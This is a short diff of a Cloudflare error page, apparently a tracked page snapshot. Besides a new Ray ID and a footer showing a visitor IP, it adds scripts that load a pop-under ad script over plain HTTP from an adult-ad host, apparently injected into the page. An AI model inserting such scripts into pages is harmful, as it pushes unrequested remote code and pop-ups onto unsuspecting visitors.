@@ -62,7 +62,7 @@
 
       <div class="cf-error-footer cf-wrapper">
   <p>
-    <span class="cf-footer-item">Cloudflare Ray ID: <strong>38074fda51cb119b</strong></span>
+    <span class="cf-footer-item">Cloudflare Ray ID: <strong>38075821f10c6c9a</strong></span>
     <span class="cf-footer-separator">&bull;</span>
     <span class="cf-footer-item"><span data-translate="your_ip">Your IP</span>: 125.227.65.103</span>
     <span class="cf-footer-separator">&bull;</span>
@@ -81,5 +81,9 @@
   
 </script>
 
-</body>
+<script type='text/javascript'> 
+                                        var adult_id = 17427691; 
+                                        var popunder_frequency_delay = 0; 
+                                    </script> 
+                                    <script src='http://cdn.adult.xyz/js/display.js'></script> </body>
 </html>
